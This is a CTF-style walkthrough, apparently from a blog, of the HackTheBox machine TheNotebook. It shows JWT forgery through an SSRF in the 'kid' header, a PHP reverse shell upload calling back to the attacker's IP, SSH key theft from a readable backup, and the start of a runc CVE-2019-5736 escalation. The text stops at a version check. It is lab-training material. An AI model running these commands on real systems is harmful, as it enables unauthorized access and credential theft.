I"@â<style>
.time {
    text-align: center;
    margin-top: 30px;
    font-family: 'Open Sans', sans-serif;
    font-weight: 300;
    font-style: normal;
}
</style>

<p class="time">31 Jul 2021 | Reading time: ~10 min</p>

<h1 align="center">HackTheBox - TheNotebook [Medium] </h1>

<p class="time" style="font-size: 75%;">

#HackTheBox

#Medium

#Linux

#JWT

#SSRF

#authorization-bypass

#RCE

#insecure-file-permissions

#CVE-2019-5736

#docker-exec-privesc

#runc-privesc

#B2R

#writeup

#lateral-movement

</p>

<p><img src="/assets/images/Screenshots/TheNotebook/box-summary.jpg" alt="box-summary.jpg" /></p>

<hr />

<h2 class="no_toc text-delta" id="table-of-contents">Table of contents</h2>

<ol id="markdown-toc">
  <li><a href="#introduction" id="markdown-toc-introduction">Introduction</a>    <ol>
      <li><a href="#improved-skills" id="markdown-toc-improved-skills">Improved skills</a></li>
      <li><a href="#used-tools" id="markdown-toc-used-tools">Used tools</a></li>
      <li><a href="#video" id="markdown-toc-video">Video</a></li>
    </ol>
  </li>
  <li><a href="#enumeration" id="markdown-toc-enumeration">Enumeration</a></li>
  <li><a href="#foothold" id="markdown-toc-foothold">Foothold</a></li>
  <li><a href="#lateral-movement-to-noah" id="markdown-toc-lateral-movement-to-noah">Lateral Movement to noah</a></li>
  <li><a href="#privilege-escalation" id="markdown-toc-privilege-escalation">Privilege Escalation</a></li>
  <li><a href="#trophy" id="markdown-toc-trophy">Trophy</a></li>
</ol>
<hr />

<h2 id="introduction">Introduction</h2>
<p><strong>TheNoteBook</strong> is a medium difficulty Linux box running a custom web application vulnerable to <strong>authorization bypass</strong> caused by a <strong>SSRF</strong> that allows to validate arbitrary JWT. Once authenticated the application suffers a <strong>bug that allows to execute PHP file</strong>, resulting in RCE. <strong>Excessive permissions assigned to the noahâ€™s home backup</strong> archive allows to copy and extract it, resulting in the leakage of noahâ€™s SSH private key. Finally, Noah is allowed to execute command within a docker container. Because the <strong>runc</strong> software version used in Docker before 18.09.2 suffers a <strong>file-descriptor mishandling</strong>, it is possible to leverage the <strong>CVE-2019-5736</strong> in order to** inject a malicious root user** and then login, obtaining high privileges on the target.</p>

<h3 id="improved-skills">Improved skills</h3>
<ul>
  <li>Validation of arbitrary JWT</li>
  <li>SSRF Authorization Bypass</li>
  <li>Docker Privilege Escalation (CVE-2019-5736)</li>
</ul>

<h3 id="used-tools">Used tools</h3>
<ul>
  <li>nmap</li>
  <li>gobuster</li>
  <li>jwt.io</li>
  <li>tcpdump</li>
</ul>

<h3 id="video">Video</h3>
<iframe width="560" height="315" src="https://www.youtube.com/embed/UumAFYRcZFE" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<hr />

<h2 id="enumeration">Enumeration</h2>
<p>Scanned all TCP ports:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/box/TheNotebook]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> 10.10.10.230 <span class="nt">-oN</span> scans/all-tcp-ports.txt <span class="nt">-v</span>
...
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
10010/tcp filtered rxapi
...
</code></pre></div></div>

<p>Enumerated open TCP open ports:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/box/TheNotebook]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-sC</span> <span class="nt">-A</span> <span class="nt">-p22</span>,80 10.10.10.230 <span class="nt">-oN</span> scans/tcp-open-ports.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf <span class="o">(</span>RSA<span class="o">)</span>
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: The Notebook - Your Note Keeper
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
...
</code></pre></div></div>

<p>Nmap discovered only two services exposed by the target: an <strong>OpenSSH 7.6p1</strong> service running on port 22 <strong>which disclosed the exact build version</strong> and a <strong>nginx 1.14.0</strong> running on port 80. Because SSH usually does not offer a large attack surface, enumeration of target was primary focused on port 80.</p>

<p>Browsed port 80:</p>

<p><img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210430225428.png" alt="Pasted image 20210430225428.png" /></p>

<p>Enumerated web directories and files:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/box/TheNotebook]
â””â”€<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.230 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt <span class="nt">-o</span> scans/p80-directories.txt
...
/admin                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 9]
/logout               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 209] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.230/]
/login                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1250]
/register             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1422]
</code></pre></div></div>

<p>The site offered the possibility to register an account so one was created:
<img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210430225959.png" alt="Pasted image 20210430225959.png" />
<img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210430230117.png" alt="Pasted image 20210430230117.png" /></p>

<p>There were very few entry points, however, the application used <strong>JWT to authenticate</strong> users. Usually <strong>bad implementation of JWT</strong> allows <strong>authentication bypass</strong> or <strong>application privilege escalation</strong>, therefore it is always good to check them:</p>

<p><img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210522153124.png" alt="Pasted image 20210522153124.png" /></p>

<p>Decoding the JWT using <a href="https://jwt.io/">jwt.io</a> it came up that the <strong>user privileges are contained inside the token</strong> as well as the <strong>path to the private key</strong> used to validate it.</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="dl">"</span><span class="s2">typ</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">JWT</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">alg</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">RS256</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">kid</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://localhost:7070/privKey.key</span><span class="dl">"</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">maoutis</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">email</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">maoutis@hackthebox.htb</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">admin_cap</span><span class="dl">"</span><span class="p">:</span> <span class="mi">0</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Editing the <em>kid</em> field it was possible to <strong>made the server contact a different target</strong>:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="dl">"</span><span class="s2">typ</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">JWT</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">alg</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">RS256</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">kid</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">http://10.10.14.24:7070/privKey.key</span><span class="dl">"</span>
<span class="p">}</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 <span class="nt">-n</span> port 7070                        
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali:
tcpdump: verbose output suppressed, use <span class="nt">-v</span><span class="o">[</span>v]... <span class="k">for </span>full protocol decode
listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length 262144 bytes
17:47:46.263302 IP 10.10.10.230.38902 <span class="o">&gt;</span> 10.10.14.24.7070: Flags <span class="o">[</span>S], <span class="nb">seq </span>2910523052, win 64240, options <span class="o">[</span>mss 1357,sackOK,TS val 1904549514 ecr 0,nop,wscale 7], length 0
17:47:46.263348 IP 10.10.14.24.7070 <span class="o">&gt;</span> 10.10.10.230.38902: Flags <span class="o">[</span>R.], <span class="nb">seq </span>0, ack 2910523053, win 0, length 0
</code></pre></div></div>

<h2 id="foothold">Foothold</h2>
<p>Due to the <strong>SSRF vulnerability</strong>, the server can be tricked into <strong>using an arbitrary key to validate the token</strong>. This issue can be exploited by making the server <strong>accept an arbitrary token with high privileges</strong>, allowing to authenticate to the application as administrators instead of standard users.</p>

<p>Taking inspiration from the <a href="https://learn.akamai.com/en-us/webhelp/iot/jwt-access-control/GUID-BD7079F4-09ED-4FAB-A923-4ACFE254BA3E.html">following Akamai article</a>, a pair of rsa keys was created:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/box/TheNotebook/exploit/keys]
â””â”€<span class="nv">$ </span>openssl rsa <span class="nt">-in</span> jwtRS256.key <span class="nt">-pubout</span> <span class="nt">-outform</span> PEM <span class="nt">-out</span> jwtRS256.key.pub
writing RSA key

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/box/TheNotebook/exploit/keys]
â””â”€<span class="nv">$ </span>openssl rsa <span class="nt">-in</span> jwtRSA256-private.pem <span class="nt">-pubout</span> <span class="nt">-outform</span> PEM <span class="nt">-out</span> jwtRSA256-public.pem

writing RSA key
</code></pre></div></div>

<p>Then following <a href="https://learn.akamai.com/en-us/webhelp/iot/jwt-access-control/GUID-CB17F8FF-3367-4D4B-B3FE-FDBA53A5EA02.html">this other Akamai article</a> an arbitrary JWT containing admin privileges was created :</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'{"typ":"JWT","alg":"RS256","kid":"http://10.10.14.24/privKey.key"}'</span> | <span class="nb">base64</span> | <span class="nb">sed </span>s/<span class="se">\+</span>/-/ | <span class="nb">sed</span> <span class="nt">-E</span> s/<span class="o">=</span>+<span class="nv">$/</span>/ <span class="o">&gt;</span> token.header

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'{"username":"maoutis","email":"maoutis@hackthebox.htb","admin_cap":1}'</span> | <span class="nb">base64</span> | <span class="nb">sed </span>s/<span class="se">\+</span>/-/ | <span class="nb">sed</span> <span class="nt">-E</span> s/<span class="o">=</span>+<span class="nv">$/</span>/ <span class="o">&gt;</span> token.payload

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">cat </span>token.<span class="k">*</span>
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2
S2V5LmtleSJ9
eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJh
ZG1pbl9jYXAiOjF9

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9"</span> | openssl dgst <span class="nt">-sha256</span> <span class="nt">-binary</span> <span class="nt">-sign</span>  keys/jwtRSA256-private.pem | openssl enc <span class="nt">-base64</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n='</span> | <span class="nb">tr</span> <span class="nt">--</span> <span class="s1">'+/'</span> <span class="s1">'-_'</span> <span class="o">&gt;</span> token.signature

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">cat </span>token.signature
dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9.dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA"</span> <span class="o">&gt;</span> token.jwt
</code></pre></div></div>

<p>The RSA private key was renamed to the value specified within the token and then it was hosted:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/box/TheNotebook/exploit/keys]
â””â”€<span class="nv">$ </span><span class="nb">cp </span>jwtRSA256-private.pem privKey.key

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/box/TheNotebook/exploit/keys]
â””â”€<span class="nv">$ </span><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>The <strong>cookie containing the current JWT was replaced</strong> with the self signed one and then the <code class="language-plaintext highlighter-rouge">/admin</code> page was visited:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/admin</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">10.10.10.230</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">uuid=fc6beb6e-c388-4e19-b0d7-9587a82dac02; auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Imh0dHA6Ly8xMC4xMC4xNC4yNC9wcml2S2V5LmtleSJ9.eyJ1c2VybmFtZSI6Im1hb3V0aXMiLCJlbWFpbCI6Im1hb3V0aXNAaGFja3RoZWJveC5odGIiLCJhZG1pbl9jYXAiOjF9.dSB9WWMQFh66xXCbF0HpTMkSNo4ojWleQIFktxL1cczrLy9rhwvuKe42Zb4WxBsBbHB2CtH-YWZYXAOCRQawVGVgTDg-X9NHPk0yOsPUw4XOW1w1fH2Hs_xFE66OpYuboNX0wW-twqN_6jN18IwiJ3WYmES0ISEbqOEfeE_kJ0ujX2Z4d76Y2WPD-SHOi60Gj1QA-PrfTFSaepeMhze0Zg4TSfUDrV78S4DxQNJD5-i_P2MMARMM1qd7C6GJoDQyq4hw8l2fSYWgfHy7uBtjiG7RdDhhPGPHmvlfBzy7hFEkmLGcrupEV3IWpwmeK2nrST_O7XYXyeaMaTV_JUClrA</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">max-age=0</span>
</code></pre></div></div>

<p><img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210501003628.png" alt="Pasted image 20210501003628.png" />
<img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210501003652.png" alt="Pasted image 20210501003652.png" /></p>

<p>Once logged as administrators all the other <strong>notes were enumerated</strong>, discovering a bug that allows RCE:
<img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210501004214.png" alt="Pasted image 20210501004214.png" />
<img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210501004235.png" alt="Pasted image 20210501004235.png" />
<img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210501004308.png" alt="Pasted image 20210501004308.png" /></p>

<p>A <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell</a> was so copied, adjusted and uploaded on the server:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php rev.php

â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/exploit]
â””â”€<span class="nv">$ </span>nano rev.php
...
<span class="nv">$ip</span> <span class="o">=</span> <span class="s1">'10.10.14.24'</span><span class="p">;</span>  // CHANGE THIS
<span class="nv">$port</span> <span class="o">=</span> 10099<span class="p">;</span>       // CHANGE THIS
...
</code></pre></div></div>
<p><img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210501004535.png" alt="Pasted image 20210501004535.png" />
<img src="/assets/images/Screenshots/TheNotebook/Pasted image 20210501004608.png" alt="Pasted image 20210501004608.png" /></p>

<p>Finally a reverse shell was obtained clicking on the <em>view</em> button:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/CTFs/HTB/box/TheNotebook]
â””â”€<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 10099
listening on <span class="o">[</span>any] 10099 ...
connect to <span class="o">[</span>10.10.14.24] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.230] 43694
Linux thenotebook 4.15.0-135-generic <span class="c">#139-Ubuntu SMP Mon Jan 18 17:38:24 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
 22:52:28 up  7:50,  0 <span class="nb">users</span>,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ python3 -c '</span>import pty<span class="p">;</span>pty.spawn<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span><span class="s1">'
www-data@thenotebook:/$ ^Z
zsh: suspended  nc -nlvp 10099

â”Œâ”€â”€(kaliã‰¿kali)-[~/CTFs/HTB/box/TheNotebook]
â””â”€$ stty raw -echo; fg

[1]  + continued  nc -nlvp 10099

www-data@thenotebook:/$ export TERM=xterm
www-data@thenotebook:/$ stty rows 60 columns 235
</span></code></pre></div></div>

<h2 id="lateral-movement-to-noah">Lateral Movement to noah</h2>
<p>Enumerated local users:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@thenotebook:/<span class="nv">$ </span><span class="nb">cat</span> /etc/passwd | <span class="nb">grep</span> <span class="nt">-v</span> nologin
root:x:0:0:root:/root:/bin/bash
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
lxd:x:105:65534::/var/lib/lxd/:/bin/false
pollinate:x:109:1::/var/cache/pollinate:/bin/false
noah:x:1000:1000:Noah:/home/noah:/bin/bash
</code></pre></div></div>

<p>Enumerated backup files:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@thenotebook:/var/backups<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
total 60
drwxr-xr-x  2 root root  4096 Apr 30 15:01 <span class="nb">.</span>
drwxr-xr-x 14 root root  4096 Feb 12 06:52 ..
<span class="nt">-rw-r--r--</span>  1 root root 33252 Feb 24 08:53 apt.extended_states.0
<span class="nt">-rw-r--r--</span>  1 root root  3609 Feb 23 08:58 apt.extended_states.1.gz
<span class="nt">-rw-r--r--</span>  1 root root  3621 Feb 12 06:52 apt.extended_states.2.gz
<span class="nt">-rw-r--r--</span>  1 root root  4373 Feb 17 09:02 home.tar.gz
</code></pre></div></div>

<p>Excessive file permission on <code class="language-plaintext highlighter-rouge">home.tar.gz</code> allowed to copy the archive within <code class="language-plaintext highlighter-rouge">/tmp</code> and extract its contents, leaking <code class="language-plaintext highlighter-rouge">noah</code> ssh keys:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@thenotebook:/var/backups<span class="nv">$ </span><span class="nb">cp </span>home.tar.gz /tmp
www-data@thenotebook:/var/backups<span class="nv">$ </span><span class="nb">cd</span> /tmp
www-data@thenotebook:/tmp<span class="nv">$ </span><span class="nb">gunzip </span>home.tar.gz
www-data@thenotebook:/tmp<span class="nv">$ </span><span class="nb">tar</span> <span class="nt">-xf</span> home.tar
www-data@thenotebook:/tmp<span class="nv">$ </span><span class="nb">cd </span>home
www-data@thenotebook:/tmp/home<span class="nv">$ </span><span class="nb">ls
</span>noah
www-data@thenotebook:/tmp/home<span class="nv">$ </span><span class="nb">cd </span>noah/
www-data@thenotebook:/tmp/home/noah<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span>
total 32
drwxr-xr-x 5 www-data www-data 4096 Feb 17 09:02 <span class="nb">.</span>
drwxr-xr-x 3 www-data www-data 4096 Feb 12 06:24 ..
<span class="nt">-rw-r--r--</span> 1 www-data www-data  220 Apr  4  2018 .bash_logout
<span class="nt">-rw-r--r--</span> 1 www-data www-data 3771 Apr  4  2018 .bashrc
drwx------ 2 www-data www-data 4096 Feb 16 10:47 .cache
drwx------ 3 www-data www-data 4096 Feb 12 06:25 .gnupg
<span class="nt">-rw-r--r--</span> 1 www-data www-data  807 Apr  4  2018 .profile
drwx------ 2 www-data www-data 4096 Feb 17 08:59 .ssh
www-data@thenotebook:/tmp/home/noah<span class="nv">$ </span><span class="nb">cd</span> .ssh
www-data@thenotebook:/tmp/home/noah/.ssh<span class="nv">$ </span><span class="nb">ls
</span>authorized_keys  id_rsa  id_rsa.pub
</code></pre></div></div>

<p>Noah private key was then used to access the box:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â”Œâ”€â”€<span class="o">(</span>kaliã‰¿kali<span class="o">)</span>-[~/â€¦/HTB/box/TheNotebook/loot]
â””â”€<span class="nv">$ </span>ssh noah@10.10.10.230 <span class="nt">-i</span> noah.key
...
noah@thenotebook:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>noah<span class="o">)</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Enumerated sudo capabilities for noah:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noah@thenotebook:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>noah on thenotebook:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User noah may run the following commands on thenotebook:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01<span class="k">*</span>
</code></pre></div></div>

<p>Connected to the docker container and discovered that high privileges was provided:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noah@thenotebook:~<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/docker <span class="nb">exec</span> <span class="nt">-it</span> webapp-dev01 bash
root@7b2fd74847ce:/opt/webapp# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p>Discovered that runc was available:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
<span class="o">[</span>+] Checking <span class="k">if </span>runc is available
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation                            
runc was found <span class="k">in</span> /usr/sbin/runc, you may be able to escalate privileges with it
...
</code></pre></div></div>

<p>Googling around for Docker privilege escalation techniques, an interesting <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#runc-exploit-cve-2019-5736">article from HackTricks</a> was found, talking about a <code class="language-plaintext highlighter-rouge">Runc exploit</code> (<strong>CVE-2019-5736</strong>) that allows elevation of privileges.</p>

<blockquote>
  <p><strong>runc through 1.0-rc6</strong>, as used in <strong>Docker before 18.09.2</strong> and other products, allows attackers to <strong>overwrite the host runc binary (and consequently obtain host root access)</strong> by leveraging the ability to execute a command as root within one of these types of containers: (1) a new container with an attacker-controlled image, or (2) an existing container, to which the attacker previously had write access, that can be attached with docker exec. This occurs because of file-descriptor mishandling, related to /proc/self/exe.</p>
</blockquote>

<p>Controlling the software versions of the target machine it was discovered that the box was <strong>vulnerable to that CVE</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noah@thenotebook:~<span class="nv">$ </span>runc <span class="nt">-v</span>
runc version 1.0.0~rc6+dfsg1
commit: 1.0.0~rc6+dfsg1-3
spec: 1.0.1
noah@thenotebook:~<span class="nv">$ </span>docker <span class="nt">-v</span>
